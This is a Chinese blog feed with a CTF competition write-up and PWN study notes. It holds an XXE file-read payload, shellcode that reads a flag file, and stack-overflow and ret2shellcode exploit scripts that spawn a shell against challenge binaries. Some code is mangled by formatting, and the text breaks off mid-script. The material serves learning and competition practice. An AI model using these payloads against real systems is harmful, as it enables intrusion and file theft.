<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>guipi`Blog</title>
  
  <subtitle>每天都一样，你要积极又向上</subtitle>
  <link href="https://guipi01.github.io/atom.xml" rel="self"/>
  
  <link href="https://guipi01.github.io/"/>
  <updated>2025-04-27T01:54:40.773Z</updated>
  <id>https://guipi01.github.io/</id>
  
  <author>
    <name>guipi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第十六届蓝桥杯wp</title>
    <link href="https://guipi01.github.io/posts/a8a7bd4.html"/>
    <id>https://guipi01.github.io/posts/a8a7bd4.html</id>
    <published>2025-04-27T01:12:47.000Z</published>
    <updated>2025-04-27T01:54:40.773Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="数据分析-Flowzip"><a href="#数据分析-Flowzip" class="headerlink" title="数据分析 - Flowzip"></a>数据分析 - Flowzip</h3><ul><li>操作步骤： 首先打开流量数据， 发现其中存在大量压缩包， 经统计共有 99 个。 随后， 运用二分法查找， 最终在046.zip包内找到了flag。</li><li>网络请求示例  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    GET /046.zip HTTP/1.1</span><br><span class="line">    Host: 10.100.200.130</span><br><span class="line">    Connection: keep-alive</span><br><span class="line">    Accept-Encoding: gzip, deflate Accept: */*</span><br><span class="line">    User-Agent: python-requests/2.27.1 HTTP/1.0 200 OK</span><br><span class="line">    Server: SimpleHTTP/0.6 Python/2.7.15 Date: Fri, 25 Apr 2025 16:02:46 GMT    Content-type: application/zip</span><br><span class="line">    Content-Length: 158</span><br><span class="line">    Last-Modified: Fri, 25 Apr 2025 15:58:14 GMT</span><br><span class="line"></span><br><span class="line">文件内部分内容显示为:</span><br><span class="line"></span><br></pre></td></tr></table></figure>PK……..G..Z.4u.<em>…</em>…..jpkwz.txtflag{c6db63e6-6459 -4e75 -bb37-3aecd2b947b}PK……..G.Z.4u.<em>…</em>…jpkwz.txt PK….7…Q…..<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 漏洞挖掘 - 星际XML解析器</span><br><span class="line"></span><br><span class="line">1. 漏洞判断： 经分析， 该 XML 解析器疑似存在 XXE 漏洞。</span><br><span class="line"></span><br><span class="line">2. 利用方法： 构造如下 XML 代码进行文件读取尝试。</span><br><span class="line"></span><br><span class="line">   - 构造payload</span><br><span class="line"></span><br><span class="line">     - ```dtd</span><br><span class="line">       &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [</span><br><span class="line">       &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;</span><br><span class="line">       &lt;root&gt;</span><br><span class="line">       &lt;data&gt;&amp;xxe;&lt;/data&gt; </span><br><span class="line">       &lt;/root&gt;</span><br></pre></td></tr></table></figure></li></ul><p>执行上述操作后， 成功读取到flag</p><h3 id="密码破解-Enigma"><a href="#密码破解-Enigma" class="headerlink" title="密码破解 - Enigma"></a>密码破解 - Enigma</h3><ol><li>解密方式： 依据附件中提供的方法，在<a href="https://cyberchef.org/网站上，">https://cyberchef.org/网站上，</a> 选择与题目要求一致的配置选项， 即可获得解密结果。也可使用厨师的本地工具进行解密操作。<br><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/图片1.png" style="zoom:50%;" /></li></ol><h3 id="码破解-easy-AES"><a href="#码破解-easy-AES" class="headerlink" title="码破解 - easy_AES"></a>码破解 - easy_AES</h3><ol><li><p>题目回顾<br> 已知加密逻辑如下：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    gift = a0 &amp; a1           # a0=int(key0,16) , a1=int(key1,16) </span><br><span class="line">    key1 = permutation(key0) # 逐 4 bit nibble 的随机置换</span><br><span class="line">    cipher = AES-CBC_&#123;k1,IV=k0&#125;^&#123;-1&#125;( AES-CBC_&#123;k0,IV=k1&#125;( pad(flag) ) )</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">​同时已知以下数据:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gift  = 64698960125130294692475067384121553664<br>key1  = 74aeb356c6eb74f364cd316497c0f714<br>cipher= 36bf9bb19314829aa4c2afd04cadbb35…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. 信息泄露分析</span><br><span class="line"></span><br><span class="line">| 信息源             | 泄漏内容 | 作用 |</span><br><span class="line">| :----------------- | -------- | ---- |</span><br><span class="line">| permutation        |  key1 是对 key0 每个nibble 的一张 16 → 16 置换表        | 将 128-bit 的未知量拆成32 个 4-bit 子问题 |</span><br><span class="line">|gift = key0 &amp; key1     |当key1的某一位是1时，gift把对应key0的那一位原样泄漏|对 128 bit 中的 68 bit 给 出真值|</span><br><span class="line"></span><br><span class="line">将 128 bit 按 nibble切分 （高位在前）， 可为每个输出 nibble `yyy`得到一个形如一个形如x&amp;m=bx\;&amp;\;m=bx&amp;m=b的约束`xxx`为对应的输入 nibble.将同一`yyy`在32个位置上收集到的约束交叉求交， 得到下表可行集大小：</span><br><span class="line"></span><br><span class="line">| y     | 可能的x数 | y    | 可能的x数 |</span><br><span class="line">| ----- | --------- | ---- | --------- |</span><br><span class="line">| 15    | 1         | 9    | 4         |</span><br><span class="line">| 7     | 2         | 10   | 4         |</span><br><span class="line">| 11    | 2         | 12   | 4         |</span><br><span class="line">| 13    | 2         | 3    | 4         |</span><br><span class="line">| 14    | 2         | 5    | 4         |</span><br><span class="line">| 1     | 8         | 4    | 8         |</span><br><span class="line">| 0,2,8 | 16        | -    | -         |</span><br><span class="line"></span><br><span class="line">其中`15-&gt;x`已唯一确定，大多数`y`只有2-4个候选。</span><br><span class="line"></span><br><span class="line">3. 还原置换表并爆破 key0</span><br><span class="line">    + 回溯枚举置换表：依y的候选集大小（小→大）递归分配唯一的x， 遇到冲突回溯，理论搜索树规模 &lt; 2¹² ≈ 4 K 次尝试。</span><br><span class="line">    </span><br><span class="line">    + 验证候选 key0： 对每个完整置换表生成key0=map− 1(key1),  逆向原双重 AES 流程：</span><br><span class="line">    </span><br><span class="line">    + ```python</span><br><span class="line">      c0 = AES.new(key1, CBC, iv=key0).encrypt(cipher) pt = AES.new(key0, CBC, iv=key1).decrypt(c0)</span><br></pre></td></tr></table></figure><ul><li><p>只接受 PKCS#7 填充正确， 且含 “flag { …}” 字样的结果。</p></li><li><p>唯一命中：</p></li><li><p>```<br>key0 = bafc950d1dc9ba75da1e56da4b187b6a<br>flag = flag{886769b5-2301-4c37-bb73-4480b4eab682}</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line">3. 代码实现</span><br><span class="line">   </span><br><span class="line">    ```python</span><br><span class="line">    #!/usr/bin/env python3 # -*- coding: utf-8 -*-</span><br><span class="line">    from Crypto.Cipher import AES</span><br><span class="line">    from Crypto.Util.Padding import unpad # 已知数据</span><br><span class="line">    gift   = 64698960125130294692475067384121553664 key1_hex = &quot;74aeb356c6eb74f364cd316497c0f714&quot;</span><br><span class="line">    cipher_hex = (&quot;36bf9bb19314829aa4c2afd04cadbb35&quot; &quot;0e7c3e8c7cf05e646c7e58c752c a5ab&quot;</span><br><span class="line">    &quot;165e722&quot;  # 省略后的示意， 请替换为完整 hex ).replace(&quot; &quot;, &quot;&quot;)</span><br><span class="line">    cipher = bytes.fromhex(cipher_hex)</span><br><span class="line">    # 将 gift 拆成 32 个 nibble</span><br><span class="line">    gift_bin = format(gift, &#x27;0128b&#x27;)</span><br><span class="line">    gift_nibbles = [int(gift_bin[i*4:(i+1)*4], 2) for i in range(32)] # 将 key1 拆成 32 个 nibble</span><br><span class="line">    key1_nibbles = [int(key1_hex[i:i+1], 16) for i in range(32)]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    # 1) 对每个位置 i， 计算所有满足 x &amp; m == b 的 x 值 pos_cands = []</span><br><span class="line">    for i in range(32):</span><br><span class="line">    m = key1_nibbles[i] b = gift_nibbles[i]</span><br><span class="line">    cands = [x for x in range(16) if (x &amp; m) == b] pos_cands.append(cands)</span><br><span class="line">    # 2) 按照 key1_nibble 的值 y 分组， 交叉约束得到每个 y 的候选 x 集合</span><br><span class="line">    from collections import defaultdict positions_by_y = defaultdict(list)</span><br><span class="line">    for i, y in enumerate(key1_nibbles):</span><br><span class="line">    positions_by_y[y].append(i) y_cands = &#123;&#125;</span><br><span class="line">    for y, poses in positions_by_y.items():</span><br><span class="line">    # 取所有位置候选集的交集    s = set(pos_cands[poses[0]]) for i in poses[1:]:</span><br><span class="line">    s &amp;= set(pos_cands[i]) y_cands[y] = list(s)</span><br><span class="line">    # 3) 回溯枚举全局反置换 inv_map: y -&gt; x used = set()</span><br><span class="line">    inv_map = &#123;&#125; solutions = []</span><br><span class="line">    # 按候选集大小升序排序， 先分配约束最严的 y</span><br><span class="line">    items = sorted(y_cands.items(), key=lambda kv: len(kv[1])) def dfs(idx):</span><br><span class="line">    if idx == len(items):</span><br><span class="line">    # 已给所有 y 分配， 生成 key0_hex 并验证</span><br><span class="line">    key0_nibbles = [inv_map[y] for y in key1_nibbles] key0_hex = &quot;&quot;.join(f&quot;&#123;n:x&#125;&quot; for n in key0_nibbles)</span><br><span class="line">    # 尝试解密</span><br><span class="line">    aes0 = AES.new(bytes.fromhex(key0_hex), AES.MODE_CBC,</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    bytes.fromhex(key1_hex))</span><br><span class="line">    aes1 = AES.new(bytes.fromhex(key1_hex), AES.MODE_CBC, bytes.fromhex(key0_hex))</span><br><span class="line">    try:</span><br><span class="line">    pt = unpad(aes0.decrypt(aes1.encrypt(cipher)), 16) if pt.startswith(b&quot;flag&#123;&quot;):</span><br><span class="line">    print(&quot;找到正确 key0:&quot;, key0_hex) print(&quot;明文 flag:&quot;, pt.decode())</span><br><span class="line">    solutions.append((key0_hex, pt.decode()))</span><br><span class="line">    return True except:</span><br><span class="line">    pass</span><br><span class="line">    return False</span><br><span class="line">    y, cands = items[idx] for x in cands:</span><br><span class="line">    if x in used:</span><br><span class="line">    continue</span><br><span class="line">    inv_map[y] = x used.add(x)     if dfs(idx+1):</span><br><span class="line">    return True    used.remove(x) del inv_map[y]</span><br><span class="line">    return False # 启动回溯</span><br><span class="line">    dfs(0)</span><br><span class="line">    if not solutions:</span><br><span class="line">    print(&quot;未找到合法解， 请检查输入的 cipher 是否完整 。&quot;)</span><br></pre></td></tr></table></figure></li></ul><ol><li>为什么搜索量如此之小？<br>gift显式泄露 超过一半的 key0 比特， 把每个 nibble 的候选数压到 1-4.<br>置换表必须 一一对应， 进一步形成强约束.<br>CBC 双重加 - 解的 “ 自相矛盾” 设计让 单条密文就能验证密钥正确性 （无需额外明文） 。</li></ol></li></ol><h3 id="情报收集-黑客密室逃脱"><a href="#情报收集-黑客密室逃脱" class="headerlink" title="情报收集 - 黑客密室逃脱"></a>情报收集 - 黑客密室逃脱</h3><ol><li>操作步骤： 通过文件读取操作， 发现目标站点是基于 Python 搭建的 。读取/file?name=app.py获取网站源码， 接着访问/file?name=hidden.txt得到密钥。</li><li>解密脚本： 根据获取的密钥， 编写如下解密脚本：</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encrypted_sensitive_info =</span><br><span class="line"><span class="string">&quot;d9d1c4d9e0a58fa19ab0979a9661a59996d792a8959bc7a694986868a09799d5c7a6c1cec9 de67696ab1&quot;</span></span><br><span class="line">encryption_key = <span class="string">&quot;secret_key3424&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_decrypt</span>(<span class="params">encrypted_hex, key</span>):</span><br><span class="line">encrypted_bytes = <span class="built_in">bytes</span>.fromhex(encrypted_hex) decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_bytes)):</span><br><span class="line">encrypted_char = encrypted_bytes[i] key_char = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line">decrypted += <span class="built_in">chr</span>(encrypted_char - <span class="built_in">ord</span>(key_char)) <span class="keyword">return</span> decrypted</span><br><span class="line">decrypted_sensitive_info = simple_decrypt(encrypted_sensitive_info, encryption_key) <span class="built_in">print</span>(<span class="string">&quot;解密后的敏感信息:&quot;</span>, decrypted_sensitive_info)</span><br></pre></td></tr></table></figure><h3 id="逆向分析-ShadowPhases"><a href="#逆向分析-ShadowPhases" class="headerlink" title="逆向分析 - ShadowPhases"></a>逆向分析 - ShadowPhases</h3><ol><li>分析方法： 采用动态调试手段， 对目标程序进行三段式动态调试。</li><li>调用过程：<br><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/图片2.png" style="zoom:50%;" /><br><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/图片3.png" style="zoom:50%;" /><br><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/图片4.png" style="zoom:50%;" /></li><li>结果获取： 通过对调试过程中获取的数据进行拼接， 最终得到flag</li></ol><h3 id="RuneBreach"><a href="#RuneBreach" class="headerlink" title="RuneBreach"></a>RuneBreach</h3><ol><li>查看程序基本信息<br> 首先， 对 chall 程序进行基本信息的查看， 以了解其大致情况。 接着运行该程序， 经过观察发现，程序在四轮交互后， 角色的血  量会被清空。</li><li>利用 IDA 进行函数分析<br> 使用 IDA（交互式反汇编器） 对程序进行逆向分析， 以明确各个函数的主要功能。在分析过程中，发现程序存在缓冲区溢出漏洞，具体是由于使用了不安全的gets函数。这个函数不会检查输入缓冲区的边界，从而可能导致攻击者覆盖相邻的内存区域， 进而 执行任意代码。<br> <img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/图片5.png" style="zoom:50%;" /></li><li>发现任意代码执行漏洞</li></ol><p>​    进一步分析代码可知， 程序中存在任意代码执行漏洞。 read(0,addr, 0x420uLL) 函数允许用户向可执行内存地址 addr 写入最多 1056 字节的数据。 而 ((  int64(*)(void))addr)() 语句则直接将 addr 作为函数指针调用， 这意味着程序会执行用户输入的数据。 因此， 我们可以将精心构 造的 shellcode 写入 addr，程序会自动执行该 shellcode， 无 需额外进行控制流劫持操作。</p><ol><li>绕过Canary保护</li></ol><p>为了绕过程序可能存在的 Canary 保护机制， 我们选择使用 boss_victory 方法。 Canary 是一种用于防止栈溢出攻击 的安全机制， 通过在栈帧中插入一个随机值（Canary 值） ， 在函数返回时检查该值是否被修改来判断栈是否被溢出。 而 boss_victory 方法可以有效地绕过这种保护。</p><ol><li>构造Payload主体</li></ol><p>以下是构造的 shellcode， 其功能是打开并读取 ./flag 文件 的内容：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment"># 生成 shellcode shellcode = asm(&#x27;&#x27;&#x27;</span></span><br><span class="line">mov r9, <span class="number">0x67616c662f2e</span></span><br><span class="line">push r9</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax syscall</span><br><span class="line">push <span class="number">3</span>; pop rdi</span><br><span class="line">push <span class="number">0x100</span>; pop rdx mov rsi, rsp</span><br><span class="line">push SYS_read</span><br><span class="line">pop rax syscall</span><br><span class="line">push <span class="number">1</span>; pop rdi mov rsi, rsp</span><br><span class="line">push SYS_write</span><br><span class="line">pop rax</span><br><span class="line">syscall <span class="string">&#x27;&#x27;&#x27;)</span></span><br></pre></td></tr></table></figure><p>执行 exp 获取  flag# 这里需要根据实际情况完善与程序交互的代码例 如 ，连接到程序 、发送 shellcode 等操作</p><ol><li>执行 exp 并获取 flag<br>最后 ，将构造好的 Payload 发送给目标程序， 即可触发 shellcode 的执行 ，从而读取并输出 ./flag 文件的内容 ，成功获取 flag。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://guipi01.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://guipi01.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>pwn笔记</title>
    <link href="https://guipi01.github.io/posts/bb16f4e7.html"/>
    <id>https://guipi01.github.io/posts/bb16f4e7.html</id>
    <published>2025-04-06T09:46:59.000Z</published>
    <updated>2025-04-06T09:58:38.899Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="PWN学习"><a href="#PWN学习" class="headerlink" title="PWN学习"></a>PWN学习</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>可执行文件的分类</p><p>Windows(PE)：.exe可执行程序    .dll动态链接库     .lib静态链接库</p><p>Linux(ELF): .out可执行程序     .so动态链接库     .a静态链接库</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-26 11.12.16.png" alt="截屏2025-02-26 11.12.16" style="zoom:50%;" /></p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>使用pwntools快速生成对应架构的shellcode</p><ol><li>设置目标架构</li><li>生成shellcode</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Linux-重定向"><a href="#Linux-重定向" class="headerlink" title="Linux 重定向"></a>Linux 重定向</h5><p>Linux标准输出重定向2&gt;&amp;1,1&gt;&amp;2</p><ol><li><p>在Linux中，最常使用的FD(file descriptor) 大概有三个，分别是：</p><ol><li>0是一个文件描述符，表示标准输入(stdin)</li><li>1是一个文件描述符，表示标准输出(stdout)</li><li>2是一个文件描述符，表示标准错误(stderr)</li></ol></li><li><p>在标准情况下，这些FD分别跟如下设备关联：</p><ol><li>stdin(0):keyboard 键盘输入，并返回在前端</li><li>stdout(1):monitor正确返回值，输出到前端</li><li>stderr(2):monitor错误返回值，输出到前端</li></ol></li><li>可以通过下面的方法改变输出的FD：<ul><li><code>1&gt;&amp;2</code>正确返回值传递给2输出通道 &amp;2表示2输出通道，如果此处错写成1&gt;2就表示把1输出重定向到文件2中</li><li><code>2&gt;&amp;1</code>错误返回值传递给1输出通道，同样&amp;1表示1输出通道</li></ul></li><li>符号”&gt;”和”&amp;”说明：<ol><li><code>&gt;</code>是重定向符，就是把前面输出的内容重定向到后面指定的位置。<ol><li><code>echo &quot;abc&quot; &gt; test.txt</code>：把abc输入到test.txt文档中</li><li><code>&gt;</code>前是可以加数字来说明把什么内容重定向到文件中，默认是把标准输出重定向到文件中</li></ol></li><li><code>&amp;</code>是一个描述符，如果1或2前面不加&amp;，会被当成一个普通文件：<ul><li><code>1&gt;&amp;2</code>意思是把标准输出重定向到标准错误</li><li><code>2&gt;&amp;1</code>意思是把标准错误输出重定向到标准输出</li><li><code>&amp;&gt;filename</code>意思是吧标准输出和标准错误输出都重定向到文件filename中</li></ul></li></ol></li></ol><h5 id="system的参数而言，’-bin-sh’-’sh’-’-0-’-这三者似乎都可以返回shell"><a href="#system的参数而言，’-bin-sh’-’sh’-’-0-’-这三者似乎都可以返回shell" class="headerlink" title="system的参数而言，’/bin/sh’,’sh’,’$(0)’,这三者似乎都可以返回shell"></a>system的参数而言，’/bin/sh’,’sh’,’$(0)’,这三者似乎都可以返回shell</h5><ol><li><p>strings 是Linux的指令</p><p><code>strings filename | grep /bin/sh</code></p></li><li><p>‘sh’ 这个是环境变量配置，做题的时候遇到过，用于替换’/bin/sh’,可以尝试一下</p><p>在linux pwn中，<code>$0</code>通常代表着程序本身的路径。在机器码中，<code>$0</code>表示<code>\x24\x30</code></p><p>利用<code>system($0)</code>可以获得shell权限，因为<code>system()</code>函数会执行传入的字符串作为命令</p><p>需要注意的是，这是一种常见的漏洞利用方式，但具体实现方法取决于程序的具体漏洞。</p></li></ol><h5 id="蓝桥杯pwn的fd题目"><a href="#蓝桥杯pwn的fd题目" class="headerlink" title="蓝桥杯pwn的fd题目"></a>蓝桥杯pwn的fd题目</h5><p>首先分析源码，在main函数中看到了两次输入，第一次输入info是在bss段，然后没有发现/bin/sh，在后变check函数中，发现过滤了/bin/sh，但是没有过滤<code>$0</code>，首先想到了经典了ret2shellcode，但是最后有一个close(1),结合题目应该是需要重定向，close(1)关闭了stdout，因此需要将stdout重定向到stderr使正常输出。</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 00.32.26.png" alt="截屏2025-03-07 00.32.26" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 00.33.05.png" alt="截屏2025-03-07 00.33.05" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-07 00.35.16.png" alt="截屏2025-03-07 00.35.16" style="zoom:50%;" /></p><p>编写exp，获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system_addr = <span class="number">0x4005d0</span></span><br><span class="line">bss_addr = <span class="number">0x601090</span></span><br><span class="line">rdi_addr = <span class="number">0x400933</span></span><br><span class="line">ret_addr = <span class="number">0x4005ae</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;stack.\n&#x27;</span>,<span class="string">b&#x27;$0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;...\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p64(ret_addr)+ p64(rdi_addr) + p64(bss_addr) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;exec 1&gt;&amp;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><ol><li><p>连接</p><ol><li>本地： io = porcess(“./文件名”)</li><li>远程：io = remote(“IP”,端口)</li></ol></li><li><p>解析文件</p><p>解析文件：elf = ELF(“./文件名”)</p></li><li><p>发送数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.send(str)</span><br><span class="line">io.sendline(str)</span><br><span class="line">io.sendafter(&quot;str1&quot;,str2)</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>接收数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.recv()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(&quot;str&quot;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><div class="table-container"><table><thead><tr><th>作用</th><th>命令</th></tr></thead><tbody><tr><td>设置断点</td><td>break</td></tr><tr><td>启动程序</td><td>run</td></tr><tr><td>继续执行程序</td><td>continue</td></tr><tr><td>单步执行程序，跳过函数调用</td><td>next</td></tr><tr><td>单步执行程序，进入函数调用</td><td>step</td></tr><tr><td>显示内存中的内容</td><td>x/<n/f/u> （x $rbp-0x8）查看rbp-0x8的值</td></tr><tr><td>退出gdb</td><td>quit</td></tr><tr><td>查看汇编代码</td><td>disassemble(简写disass)</td></tr><tr><td>显示进程的虚拟内存映射</td><td>vmmap</td></tr></tbody></table></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x/50xg $rsp       //从 $rsp 寄存器指向的内存地址开始，以 8 字节为单位，显示接下来的 50 个单元的内存内容，每个单元以十六进制格式显示。</span><br><span class="line">stack 0x28        //查看栈空间</span><br></pre></td></tr></table></figure><h3 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h3><h4 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h4><p>32位的程序是通过栈来传参</p><h4 id="64位程序"><a href="#64位程序" class="headerlink" title="64位程序"></a>64位程序</h4><p>64位的程序是通过寄存器和加上栈来传参，传递的顺序依次是rdi,rsi,rdx,rcx,r8,r9</p><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>Bss:保存未初始化的全局变量和局部静态变量</p><p>Data:保存已初始化的全局变量和局部静态变量</p><p>Text:保存可执行的机器指令</p><p>大端字节序；高位字节在前，低位字节在后</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 00.08.58.png" alt="截屏2025-03-05 00.08.58" style="zoom:50%;" /></p><p>小端字节序：低位字节在前，高位字节在后</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 00.09.06.png" alt="截屏2025-03-05 00.09.06" style="zoom:50%;" /></p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>ROP的原理是利用程序内存中已存在的以返回指令结尾的指令序列(gadgets)来控制程序执行流程</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">命令</span><br><span class="line">查找某个模式的代码：ROPgadget --binary 文件名 --only &quot;pop|rdi|ret&quot;</span><br><span class="line">查找所有代码：ROPgadget --binary 文件名 --all</span><br><span class="line">查找字符串：ROPgadget --binary 文件名 --string &quot;/bin/sh&quot;</span><br><span class="line">查找有int 0x80的地址：ROPgadget --binary 文件名 --only &quot;int&quot;</span><br><span class="line">查找ROP链：ROPgadget --binary 文件名 --ropchain</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 00.45.49.png" alt="截屏2025-03-05 00.45.49" style="zoom:50%;" /></p><h3 id="ret2text题"><a href="#ret2text题" class="headerlink" title="ret2text题"></a>ret2text题</h3><h4 id="原理一"><a href="#原理一" class="headerlink" title="原理一"></a>原理一</h4><p>将返回地址覆盖为程序.text段中已有的代码的地址，从而执行本身的代码由于我们要获得shell，二进制文件中本身就含有一个可以直接获取权限的函数，然后我们通过栈溢出漏洞，控制程序执行流，把返回地址覆盖为这个函数的地址让文件运行这个获取权限的函数，我们就可以拿到权限，进而获得flag</p><p>(一)基本步骤</p><ol><li>检查二进制文件的信息<ol><li>file 文件名    看一下多少位的</li><li>checksec 文件名     看一下保护程序</li></ol></li><li>打开ida查看二进制的反汇编代码</li><li>编写exp脚本</li><li>开启靶机，进行远程连接</li><li>利用exp脚本打通远程，获取flag</li></ol><h4 id="原理二"><a href="#原理二" class="headerlink" title="原理二"></a>原理二</h4><p>当二进制文件里没有直接可以获取权限的后门函数的时候，只有一个system()函数，然后在其他的地方有/bin/sh字符串，那么我们就可以把他们组合一下，变成<code>system(&quot;/bin/sh&quot;)</code>，来获取权限</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>一、基本原理</p><p>shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell</p><p>通过栈溢出控制程序执行流，进而去执行写入shellcode带啊吗的位置</p><p>二、bss段上的ret2shellcode</p><p>程序窜爱一个输入，可以把数据写入bss段，还有一个栈溢出漏洞可以让我们去控制程序执行流。那我们就可以把shellcode写入bss段， 然后我们通过栈溢出漏洞去跳转到写入shellcode的位置，然后去执行，就可以获得权限</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 08.33.18.png" alt="截屏2025-03-05 08.33.18" style="zoom:50%;" /><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-05 09.08.40.png" alt="截屏2025-03-05 09.08.40" style="zoom:50%;" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1&#x27;</span>)    <span class="comment">#本地的</span></span><br><span class="line">io = remote(<span class="string">&#x27;120.46.59.242&#x27;</span>, <span class="number">2117</span>)        <span class="comment">#远程IP</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x68</span> + <span class="number">4</span> <span class="comment">#32位所以是4</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())    <span 